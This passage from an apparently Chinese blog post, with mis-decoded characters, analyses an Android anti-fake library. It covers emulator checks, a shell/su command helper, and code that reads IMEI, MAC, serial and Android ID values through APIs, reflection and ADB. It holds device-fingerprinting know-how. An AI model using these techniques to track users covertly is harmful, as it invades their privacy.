â€œgenericâ€ ä½œä¸ºå…¶è®¾å¤‡åç§°çš„ä¸€éƒ¨åˆ†ï¼Œä¾‹å¦‚ â€œgeneric_x86â€ã€â€generic_arm64â€ ç­‰ã€‚</li></ul><h4 id="isEmulatorFromAbi"><a href="#isEmulatorFromAbi" class="headerlink" title="isEmulatorFromAbi"></a>isEmulatorFromAbi</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isEmulatorFromAbi</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    String abi= AndroidDeviceIMEIUtil.getCpuAbi();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !TextUtils.isEmpty(abi) &amp;&amp; abi.contains(<span class="string">&quot;x86&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getCpuAbi</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertiesGet.getString(<span class="string">&quot;ro.product.cpu.abi&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ¶æ„æ¥åˆ¤æ–­æ¨¡æ‹Ÿå™¨</p><h4 id="isEmulatorFromCpu"><a href="#isEmulatorFromCpu" class="headerlink" title="isEmulatorFromCpu"></a>isEmulatorFromCpu</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æŸ¥æ€æ¯”è¾ƒä¸¥æ ¼ï¼Œæ”¾åœ¨æœ€åï¼Œç›´æ¥pass x86</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isEmulatorFromCpu</span><span class="params">()</span> &#123;</span><br><span class="line">    ShellAdbUtils.<span class="type">CommandResult</span> <span class="variable">commandResult</span> <span class="operator">=</span> ShellAdbUtils.execCommand(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">cpuInfo</span> <span class="operator">=</span> commandResult == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : commandResult.successMsg;</span><br><span class="line">    <span class="keyword">return</span> !TextUtils.isEmpty(cpuInfo) &amp;&amp; ((cpuInfo.toLowerCase().contains(<span class="string">&quot;intel&quot;</span>) || cpuInfo.toLowerCase().contains(<span class="string">&quot;amd&quot;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥é€šè¿‡å‘½ä»¤è¡Œè·å–cpuä¿¡æ¯ï¼Œå¦‚æœæ˜¯intelæˆ–è€…amdçš„ç›´æ¥æ€æ­»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> CommandResult <span class="title function_">execCommand</span><span class="params">(String[] commands, <span class="type">boolean</span> isRoot, <span class="type">boolean</span> isNeedResultMsg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (commands == <span class="literal">null</span> || commands.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CommandResult</span>(result, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">successResult</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">errorResult</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">successMsg</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">errorMsg</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">DataOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        process = Runtime.getRuntime().exec(isRoot ? COMMAND_SU : COMMAND_SH);</span><br><span class="line">        os = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(process.getOutputStream());</span><br><span class="line">        <span class="keyword">for</span> (String command : commands) &#123;</span><br><span class="line">            <span class="keyword">if</span> (command == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// donnot use os.writeBytes(commmand), avoid chinese charset error</span></span><br><span class="line">            os.write(command.getBytes());</span><br><span class="line">            os.writeBytes(COMMAND_LINE_END);</span><br><span class="line">            os.flush();</span><br><span class="line">        &#125;</span><br><span class="line">        os.writeBytes(COMMAND_EXIT);</span><br><span class="line">        os.flush();</span><br><span class="line"></span><br><span class="line">        result = process.waitFor();</span><br><span class="line">        <span class="comment">// get command result</span></span><br><span class="line">        <span class="keyword">if</span> (isNeedResultMsg) &#123;</span><br><span class="line">            successMsg = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            errorMsg = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            successResult = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">            errorResult = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getErrorStream()));</span><br><span class="line">            String s;</span><br><span class="line">            <span class="keyword">while</span> ((s = successResult.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                successMsg.append(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ((s = errorResult.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                errorMsg.append(s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="literal">null</span>) &#123;</span><br><span class="line">                os.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (successResult != <span class="literal">null</span>) &#123;</span><br><span class="line">                successResult.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (errorResult != <span class="literal">null</span>) &#123;</span><br><span class="line">                errorResult.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (process != <span class="literal">null</span>) &#123;</span><br><span class="line">            process.destroy();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CommandResult</span>(result, successMsg == <span class="literal">null</span> ? <span class="literal">null</span> : successMsg.toString(), errorMsg == <span class="literal">null</span> ? <span class="literal">null</span></span><br><span class="line">            : errorMsg.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>process = Runtime.getRuntime().exec(isRoot ? COMMAND_SU : COMMAND_SH);</code>è¿è¡Œä¸€ä¸ªshell</p><ul><li>é€šè¿‡ <code>DataOutputStream os = new DataOutputStream(process.getOutputStream());</code> è·å–åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥æµ</li><li>ä»£ç ä¼šéå† <code>commands</code> æ•°ç»„ï¼Œå°†æ¯ä¸€æ¡å‘½ä»¤å†™å…¥è¿™ä¸ªæµä¸­</li><li>æ¯æ¡å‘½ä»¤åéƒ½ä¼šå†™å…¥ä¸€ä¸ªæ¢è¡Œç¬¦ <code>COMMAND_LINE_END</code>ï¼Œè¿™æ¨¡æ‹Ÿäº†å›è½¦æ“ä½œï¼Œæ˜¯å‘½ä»¤å¾—ä»¥æ‰§è¡Œçš„å‰æ</li><li>åœ¨æ‰€æœ‰å‘½ä»¤éƒ½å†™å…¥åï¼Œä¼šå†™å…¥ <code>COMMAND_EXIT</code> å‘½ä»¤ã€‚è¿™ä¼šä½¿ <code>su</code> æˆ– <code>sh</code> è¿›ç¨‹æ­£å¸¸é€€å‡ºï¼Œä»è€Œè®© <code>process.waitFor()</code> è°ƒç”¨å¯ä»¥ç»“æŸç­‰å¾…ã€‚å¦‚æœæ²¡æœ‰è¿™ä¸€æ­¥ï¼Œç¨‹åºä¼šæ°¸ä¹…é˜»å¡</li><li><code>result = process.waitFor();</code>: è¿™è¡Œä»£ç ä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œç›´åˆ°å­è¿›ç¨‹æ‰§è¡Œå®Œæ¯•å¹¶è¿”å›é€€å‡ºç ã€‚</li><li>å¦‚æœ <code>isNeedResultMsg</code> ä¸º <code>true</code>ï¼Œä»£ç ä¼šåˆ›å»º <code>BufferedReader</code> æ¥åˆ†åˆ«è¯»å–å­è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºæµ (<code>process.getInputStream()</code>) å’Œæ ‡å‡†é”™è¯¯æµ (<code>process.getErrorStream()</code>)ï¼Œå¹¶å°†ç»“æœå­˜å…¥ <code>StringBuilder</code></li></ul><h3 id="onCreate-2"><a href="#onCreate-2" class="headerlink" title="onCreate"></a>onCreate</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//        ç»¼åˆåˆ¤æ–­ä¸€æ¬¡</span></span><br><span class="line">        binding.btnSycnInteger.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(R.id.btn_sycn_integer);</span><br><span class="line">                textView.setText(<span class="string">&quot;ç»¼åˆåˆ¤æ–­æ˜¯å¦æ¨¡æ‹Ÿå™¨ &quot;</span> + EmulatorDetectUtil.isEmulatorFromAll(MainActivity.<span class="built_in">this</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åªè€ƒè™‘cacheï¼ŒAndroid Rä¹‹åï¼Œæ¨¡æ‹Ÿå™¨æœºåˆ¶æœ‰å˜åŒ–ï¼Œæ£€æµ‹ä¼šæœ‰é—®é¢˜</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isEmulatorFromAll</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> AndroidDeviceIMEIUtil.isRunOnEmulator(context) || detectS();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯ä¸Šè¿°å‡ ä¸ªåˆ¤æ–­çš„åˆä½“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//è·å–å…¶ä»–ç¡¬ä»¶ä¿¡æ¯</span></span><br><span class="line">    binding.btnHwinfo.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">            requestGetInfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="meta">@SuppressLint(&quot;SetTextI18n&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestGetInfo</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸åŒçš„ç‰ˆæœ¬ä¸ä¸€æ ·ï¼Œ4.3ä¹‹å‰ITelephonyæ²¡æœ‰getDeviceId</span></span><br><span class="line">    <span class="keyword">if</span> (ActivityCompat.checkSelfPermission(MainActivity.<span class="built_in">this</span>, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">        ActivityCompat.requestPermissions(MainActivity.<span class="built_in">this</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;Manifest.permission.READ_PHONE_STATE&#125;,</span><br><span class="line">                <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        renderHWInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¼šæ£€æµ‹æ˜¯å¦æœ‰<code>PackageManager.PERMISSION_GRANTED</code>æƒé™</p><p>å¦‚æœæ²¡æƒé™ä¼šæ‰§è¡Œ<code>ActivityCompat.requestPermissions</code>å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œè¯·æ±‚ç”¨æˆ·æ·»åŠ æƒé™</p><p>å¦‚æœæƒé™å·²ç»è¢«æˆäºˆï¼Œåˆ™ä¼šæ‰§è¡Œ<code>renderHWInfo();</code>å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressLint(&quot;SetTextI18n&quot;)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">renderHWInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">apideviceId</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        apideviceId = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    binding.tvDeviceid.setText(</span><br><span class="line">            <span class="string">&quot; \n \nè®¾å¤‡ä¿¡æ¯ &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;  \n\næœ€ç»ˆæ–¹æ³•è·å–IMEI  : &quot;</span> + AndroidDeviceIMEIUtil.getDeviceId(mActivity) + <span class="string">&quot; æ˜¯å¦æœ‰æ•ˆ &quot;</span> + AndroidDeviceIMEIUtil.isValidIMEI(AndroidDeviceIMEIUtil.getDeviceId(mActivity))</span><br><span class="line">                    + <span class="string">&quot;\næœ€ç»ˆæ–¹æ³•è·å–MACåœ°å€ : &quot;</span> + AndroidDeviceIMEIUtil.getMacAddress(mActivity) + <span class="string">&quot; æ˜¯å¦æœ‰æ•ˆ &quot;</span> + AndroidDeviceIMEIUtil.isValidAddress(MacAddressUtils.getMacAddress(mActivity))</span><br><span class="line">                    + <span class="string">&quot;\næœ€ç»ˆæ–¹æ³•è·å–AndroidID : &quot;</span> + AndroidDeviceIMEIUtil.getAndroidId(mActivity)</span><br><span class="line">                    + <span class="string">&quot;\næœ€ç»ˆæ–¹æ³•è·å–åºåˆ—å· : &quot;</span> + AndroidDeviceIMEIUtil.getSerialno()</span><br><span class="line">                    + <span class="string">&quot;\nç‰¹å¾å€¼æ£€æµ‹æ˜¯å¦æ¨¡æ‹Ÿå™¨  : &quot;</span> + EmuCheckUtil.mayOnEmulator(mActivity)</span><br><span class="line">                    + <span class="string">&quot; \n\nIMEIè¯¦ç»†ä¿¡æ¯: &quot;</span></span><br><span class="line">                    + <span class="string">&quot; \n\nå¯Hookç³»ç»ŸAPIè·å–Deviceid: &quot;</span> + apideviceId</span><br><span class="line">                    + <span class="string">&quot;\nProxyä»£ç†è·å–Deviceid level0 : &quot;</span> + IPhoneSubInfoUtil.getDeviceIdLevel0(mActivity)</span><br><span class="line">                    + <span class="string">&quot;\nProxyä»£ç†è·å–Deviceid level1 :&quot;</span> + IPhoneSubInfoUtil.getDeviceIdLevel1(mActivity)</span><br><span class="line">                    + <span class="string">&quot;\nProxyä»£ç†è·å–Deviceid level2 :&quot;</span> + IPhoneSubInfoUtil.getDeviceIdLevel2(mActivity)</span><br><span class="line">                    + <span class="string">&quot;\nITelephonyUtilè·å–DeviceId level0: &quot;</span> + ITelephonyUtil.getDeviceIdLevel0(mActivity)</span><br><span class="line">                    + <span class="string">&quot;\nITelephonyUtilè·å–DeviceId level1 : &quot;</span> + ITelephonyUtil.getDeviceIdLevel1(mActivity)</span><br><span class="line">                    + <span class="string">&quot;\nITelephonyUtilè·å–DeviceId level2 :&quot;</span> + ITelephonyUtil.getDeviceIdLevel2(mActivity)</span><br><span class="line">                 );</span><br><span class="line"></span><br><span class="line">    binding.tvAndroididMacSerial.setText(<span class="string">&quot;\n\nåºåˆ—å·ä¿¡æ¯ ï¼š&quot;</span> +</span><br><span class="line">            <span class="string">&quot;  \n\nç³»ç»ŸAPIåå°„è·å–åºåˆ—å· ï¼š &quot;</span> + SysAPIUtil.getSerialNumber(mActivity)</span><br><span class="line">            + <span class="string">&quot;\nç³»ç»ŸAPIåå°„è·å–åºåˆ—å· ï¼š &quot;</span> + SysAPIUtil.getJavaSerialNumber(mActivity)</span><br><span class="line">            + <span class="string">&quot;\nç›´æ¥é€šè¿‡ Build Serial &quot;</span> + Build.SERIAL</span><br><span class="line">            + <span class="string">&quot;\né€šè¿‡ADB Build Serial &quot;</span> + AndroidDeviceIMEIUtil.getSerialno()</span><br><span class="line">            + <span class="string">&quot;\nç›´æ¥nativeè·å–  Serial &quot;</span> + PropertiesGet.getString(<span class="string">&quot;ro.serialno&quot;</span>)</span><br><span class="line">            + <span class="string">&quot;\n\nMACåœ°å€ä¿¡æ¯ ï¼š&quot;</span></span><br><span class="line">            + <span class="string">&quot;\n\né€šè¿‡ç³»ç»ŸAPIè·å–MACåœ°å€  ï¼š &quot;</span> + SysAPIUtil.getMacAddress(mActivity)</span><br><span class="line">            + <span class="string">&quot;\nIwifmanager è·å–mac level 0  ï¼š &quot;</span> + IWifiManagerUtil.getMacAddress(mActivity)</span><br><span class="line">            + <span class="string">&quot;\né€šè¿‡NetworkInterfaceè·å–MACåœ°å€  ï¼š &quot;</span> + MacAddressUtils.getMacAddressByWlan0(mActivity)</span><br><span class="line">            + <span class="string">&quot;\né€šè¿‡ADBè·å–MACåœ°å€  ï¼š &quot;</span> + MacAddressUtils.getMacInfoByAdb()</span><br><span class="line"></span><br><span class="line">            + <span class="string">&quot;\n\nAndroidIDä¿¡æ¯ ï¼š&quot;</span></span><br><span class="line">            + <span class="string">&quot;\n\né€šè¿‡ç³»ç»ŸAPIè·å–ANDROID_ID (XPOSEDå¯ä»¥HOOK)  ï¼š &quot;</span> + SysAPIUtil.getAndroidId(mActivity)</span><br><span class="line">            + <span class="string">&quot;\nåå°„è·å–ç³»ç»Ÿ ANDROID_IDISettingUtils  ï¼š &quot;</span> + ISettingUtils.getAndroidProperty(mActivity, Settings.Secure.ANDROID_ID)</span><br><span class="line">            + <span class="string">&quot;\nåå°„è·å–ç³»ç»Ÿ ANDROID_ID ISettingUtils level2  ï¼š &quot;</span> + ISettingUtils.getAndroidPropertyLevel1(mActivity, Settings.Secure.ANDROID_ID)</span><br><span class="line">            + <span class="string">&quot;\n\nå…¶ä»–æ‰‹æœºå‹å·ä¿¡æ¯ ï¼š&quot;</span></span><br><span class="line">            + <span class="string">&quot;\nç³»ç»ŸAPIè·å–æ‰‹æœºå‹å· ï¼ˆä½œå‡ï¼‰  ï¼š &quot;</span> + SysAPIUtil.getPhoneManufacturer()</span><br><span class="line">            + <span class="string">&quot;\nnative ro.product.manufacturer&quot;</span> + PropertiesGet.getString(<span class="string">&quot;ro.product.manufacturer&quot;</span>)</span><br><span class="line">            + <span class="string">&quot;\nnative ro.product.model  &quot;</span> + PropertiesGet.getString(<span class="string">&quot;ro.product.model&quot;</span>)</span><br><span class="line">            + <span class="string">&quot;\nnative ro.product.device &quot;</span> + PropertiesGet.getString(<span class="string">&quot;ro.product.device&quot;</span>)</span><br><span class="line">            + <span class="string">&quot;\nnative ro.product.name&quot;</span> + PropertiesGet.getString(<span class="string">&quot;ro.product.name&quot;</span>)</span><br><span class="line">            + <span class="string">&quot;\n\n&quot;</span></span><br><span class="line">            + <span class="string">&quot;\nç³»ç»Ÿæ¶æ„  &quot;</span> + PropertiesGet.getString(<span class="string">&quot;ro.product.cpu.abi&quot;</span>)</span><br><span class="line">            + <span class="string">&quot;\nè·å–é“¾æ¥çš„è·¯ç”±å™¨åœ°å€ &quot;</span> + MacAddressUtils.getConnectedWifiMacAddress(getApplication())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="deviceidè·å–"><a href="#deviceidè·å–" class="headerlink" title="deviceidè·å–"></a>deviceidè·å–</h2><h3 id="AndroidDeviceIMEIUtil-java"><a href="#AndroidDeviceIMEIUtil-java" class="headerlink" title="AndroidDeviceIMEIUtil.java"></a>AndroidDeviceIMEIUtil.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.snail.antifake.deviceid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.annotation.SuppressLint;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.content.IntentFilter;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.telephony.TelephonyManager;</span><br><span class="line"><span class="keyword">import</span> android.text.TextUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.snail.antifake.deviceid.androidid.IAndroidIdUtil;</span><br><span class="line"><span class="keyword">import</span> com.snail.antifake.deviceid.deviceid.DeviceIdUtil;</span><br><span class="line"><span 